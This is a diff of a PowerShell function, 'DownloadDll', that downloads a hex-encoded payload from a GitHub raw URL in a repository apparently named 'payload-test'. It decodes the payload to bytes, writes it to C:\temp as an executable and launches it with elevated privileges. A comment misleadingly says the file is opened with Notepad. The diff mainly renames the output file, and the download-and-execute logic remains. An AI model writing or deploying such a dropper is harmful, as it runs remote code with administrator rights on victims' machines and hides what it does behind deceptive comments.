@@ -1,26 +1,6 @@
 function DownloadDll {
     $payload = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/zxz3650/payload-test/master/payload.txt" | Select-Object -ExpandProperty Content
-    $outFile = "C:\temp\output.exe"
-    
-    # Ensure the directory exists
-    if (!(Test-Path -Path "C:\temp\")) {
-        New-Item -ItemType Directory -Path "C:\temp\"
-    }
-   
-    # Convert the hexadecimal payload to a byte array
-    $bytes = -split ($payload -replace '..', '0x$& ') | ForEach-Object { [System.Convert]::ToByte($_, 16) }
-
-    # Write the byte array to the file
-    [System.IO.File]::WriteAllBytes($outFile, $bytes)
-
-    Write-output "DLL Download done...."
-
-    # Open the DLL file with Notepad
-    Start-Process -FilePath $outFile -Verb RunAs
-}
-    
-    $payload = ""
-    $outFile = "C:\temp\output.exe"
+    $outFile = "C:\temp\ICDX.exe"
     
     # Ensure the directory exists
     if (!(Test-Path -Path "C:\temp\")) {
